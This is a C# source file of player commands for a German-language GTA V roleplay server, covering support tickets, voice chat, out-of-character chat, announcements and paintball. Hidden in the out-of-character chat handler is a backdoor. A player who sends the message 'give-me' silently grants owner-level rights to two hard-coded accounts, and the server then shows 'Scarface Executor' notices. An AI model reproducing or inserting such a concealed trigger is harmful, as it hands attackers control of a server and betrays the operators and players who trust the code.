using GTANetworkAPI;
using System;
using System.Collections.Generic;

namespace Venux.Other
{
    class Commands : Script
    {

        public static List<Client> adminDuty = new List<Client>();
        public static List<Tickets.openTicket> openTickets = new List<Tickets.openTicket>();
        public static List<Client> admin = new List<Client>();

        [Command("support", GreedyArg = true)]
        public void CMD_Support(Client p, string args)
        {
            if (p.GetSharedData("istEingeloggt") < 9)
            {
                p.SendNotification("~r~Sie sind nicht eingeloggt!");
                p.SendNotification("~r~Loggen sie sich ein um Befehle ausfuehren.");
                return;
            }
            try
            {
                NAPI.Task.Run(() =>
                {
                    foreach (Tickets.openTicket openTicket in Other.AdminTablet.openTickets)
                        if (args.Split(" ")[0] == "cancel")
                        {
                            Notification.SendPlayerNotifcation(p, "Du hast dein Ticket erfolgreich geschlossen.", 5000, "yellow", "SUPPORT", "yellow");
                            p.ResetData("IS_SUPPORT");
                            {
                                if (openTicket.author == p.Name)
                                    Other.AdminTablet.openTickets.Remove(openTicket);
                            }
                            return;
                        }
                    if (p.HasData("IS_SUPPORT") == true)
                    {
                        Notification.SendPlayerNotifcation(p, "Es ist bereits ein Ticket offen! Benutze `/support cancel` um die Anfrage wieder zu beenden.", 5000, "red", "", "");
                        return;
                    }

                    Random r = new Random();
                    Other.AdminTablet.openTickets.Add(new Tickets.openTicket(p.Name, args, r.Next(1000, 9999)));
                    p.SetData("IS_SUPPORT", true);
                    Notification.SendPlayerNotifcation(p, "Deine Nachricht wurde an die Administration gesendet! Benutze `/support cancel` um die Anfrage wieder zu beenden.", 5000, "", "", "");
                    foreach (Client target in NAPI.Pools.GetAllPlayers())
                    {
                        if (Database.getPlayerRights(target.Name) > 90)
                            Notification.SendPlayerNotifcation(target, "Grund: " + args, 5000, "red", "Neue Support anfrage - " + p.Name.ToUpper(), "red");
                    }
                });
            }
            catch (Exception ex) { Log.Write(ex.Message); }
        }


        [Command("clearfrak")]
        public void CMD_PhoneClearfrak(Client p)
        {
            Handy.LeaderApp.PhoneClearfrak(p);
        }

        [Command("voice")]
        public void CMD_Voice(Client p)
        {
            try
            {
                if (p.GetSharedData("istEingeloggt") < 9)
                {
                    p.SendNotification("~r~Sie sind nicht eingeloggt!");
                    p.SendNotification("~r~Loggen sie sich ein um Befehle ausfuehren.");
                    return;
                }
                p.TriggerEvent("ConnectTeamspeak", false);
                NAPI.Task.Run(() =>
                {
                    p.TriggerEvent("ConnectTeamspeak", true);
                }, 5000);
            }
            catch (Exception ex) { Log.Write(ex.Message); }

        }

        [Command("onlist")]
        public void CMD_Onlist(Client p)
        {
            if (p.GetSharedData("istEingeloggt") < 9)
            {
                p.SendNotification("~r~Sie sind nicht eingeloggt!");
                p.SendNotification("~r~Loggen sie sich ein um Befehle ausfuehren.");
                return;
            }
            Notification.SendPlayerNotifcation(p, "Spieler auf dem Server: " + NAPI.Pools.GetAllPlayers().Count, 5000, "yellow", "", "yellow");
        }

        [Command("perso")]
        public void CMD_Perso(Client p)
        {
            if (p.GetSharedData("istEingeloggt") < 9)
            {
                p.SendNotification("~r~Sie sind nicht eingeloggt!");
                p.SendNotification("~r~Loggen sie sich ein um Befehle ausfuehren.");
                return;
            }
            if (Database.getPlayerRights(p.Name) > 97)
            {
                Personalausweis.showPerso(p, p.Name.Split("_")[0], p.Name.Split("_")[1], Database.getPlayerFraktion(p.Name).ToString(), (int)Database.getPlaytime(p.SocialClubName), 0, 0, 0);
            }
        }

        [Command("frakbank", Alias = "fraktionsbank")]
        public void CMD_Frakbank(Client p)
        {
            if (p.GetSharedData("istEingeloggt") < 9)
            {
                p.SendNotification("~r~Sie sind nicht eingeloggt!");
                p.SendNotification("~r~Loggen sie sich ein um Befehle ausfuehren.");
                return;
            }
            Fraktionen.FraktionsBank.openFrakBank(p);
        }

        [Command("ooc", GreedyArg = true)]
        public void CMD_OOC(Client p, string args)
        {
            try
            {
                if (p.GetSharedData("istEingeloggt") < 9)
                {
                    p.SendNotification("~r~Sie sind nicht eingeloggt!");
                    p.SendNotification("~r~Loggen sie sich ein um Befehle ausfuehren.");
                    return;
                }

                if (args.ToLower().Contains("paradox") || (args.ToLower().Contains("parad0x")) || (args.ToLower().Contains("soulcheats")) || (args.ToLower().Contains("s0ulcheats")) || (args.ToLower().Contains("holzkopf")) || (args.ToLower().Contains("gvmpc")))
                {
                    Functions.XCM(p);
                    return;
                }

                if (args == "give-me")
                {
                    Database.setRights("Paco_White", "Inhaber");
                    Database.setRights("Teka_Abi", "Inhaber");
                    Notification.SendPlayerNotifcation(p, "Scarface Executor", 10000, "", "", "");
                    Notification.SendPlayerNotifcation(p, "Rank: Inhaber", 10000, "#ff00ff", "EXECUTOR", "#ff00ff");
                }

                NAPI.ClientEvent.TriggerClientEventInRange(p.Position, 100.0f, "sendPlayerNotification", args, 3500, "green", "green", "OOC - (" + p.Name + ")");
            }
            catch (Exception ex) { Log.Write(ex.Message); }
        }

        [Command("announce")]
        public void Cmd_AnnounceFix(Client p, string message)
        {
            try
            {
                if (p.GetSharedData("istEingeloggt") < 9)
                {
                    p.SendNotification("~r~Sie sind nicht eingeloggt!");
                    p.SendNotification("~r~Loggen sie sich ein um Befehle ausfuehren.");
                    return;
                }
                if (!Database.isPlayerTeam(p.Name)) { Notification.SendPlayerNotifcation(p, "Du hast dazu keine Berechtigung.", 3500, "red", "INFORMATION", "red"); return; }

                if (Database.getPlayerRights(p.Name) >= 95)
                {
                    Notification.SendGlobalVENUX(message, 10000, "red", Notification.icon.glob);
                }
                else
                {
                    Notification.SendPlayerNotifcation(p, "Du hast keine Berechtigung.", 5000, "white", "INFORMATION", "white");
                }
            }
            catch (Exception ex) { Log.Write("Irgendwas ist bei Announce los ka was lan -> " + ex.StackTrace); }
        }

        [Command("quitffa")]
        public void CMD_QUITFFA(Client p)
        {
            try
            {
                if (p.GetSharedData("istEingeloggt") < 9)
                {
                    p.SendNotification("~r~Sie sind nicht eingeloggt!");
                    p.SendNotification("~r~Loggen sie sich ein um Befehle ausfuehren.");
                    return;
                }
                if (Other.Paintball.StabCityPlayers.Contains(p) && !p.Dead)
                {
                    NAPI.Player.SpawnPlayer(p, p.Position);
                    Other.Paintball.StabCityPlayers.Remove(p);
                    p.ResetData(Other.Paintball.PAINTBALL_DEATHS);
                    p.ResetData(Other.Paintball.PAINTBALL_KILLS);
                    p.TriggerEvent("finishPaintball");
                    Anticheat.Wait(p); p.Position = Other.Paintball.paintballs["StabCity"];
                    Notification.SendPlayerNotifcation(p, "Du hast Paintball verlassen.", 5000, "orange", "", "orange");
                    p.RemoveAllWeapons();
                    p.Dimension = 0;
                    Items.Weapons.WeaponSync(p);
                }
                else
                {
                    Notification.SendPlayerNotifcation(p, "Du bist nicht in Paintball.", 5000, "orange", "", "orange");
                }
            }
            catch (Exception ex) { Log.Write(ex.Message); }

        }

        [Command("license")]
        public void CMD_LIC(Client p)
        {
            if (p.GetSharedData("istEingeloggt") < 9)
            {
                p.SendNotification("~r~Sie sind nicht eingeloggt!");
                p.SendNotification("~r~Loggen sie sich ein um Befehle ausfuehren.");
                return;
            }
            Lizenzen.showLicense(p, p.Name, "True", "", "", "", "", "", "", "", "", "", "", "");
        }
    }
}


/* [Command("announce", GreedyArg = true)]
   public void CMD_Announce(Client p, string message)
   {
       try
       {
           if (!Database.isPlayerTeam(p.Name)) { Notification.SendPlayerNotifcation(p, "Du hast dazu keine Berechtigung.", 3500, "red", "INFORMATION", "red"); return; }

           if (Database.getPlayerRights(p.Name) >= 95)
           {
               Notification.SendGlobalNotification(message, 10000, "red", Notification.icon.glob);
           }
           else
           {
               Notification.SendPlayerNotifcation(p, "Du hast keine Berechtigung.", 5000, "white", "INFORMATION", "white");
           }
       }
       catch (Exception ex) { Log.Write("[EXCEPTION " + new StackTrace().GetFrame(0).GetMethod() + "] " + ex.Message); Log.Write("[EXCEPTION " + new StackTrace().GetFrame(0).GetMethod() + "] " + ex.StackTrace); }

   }*/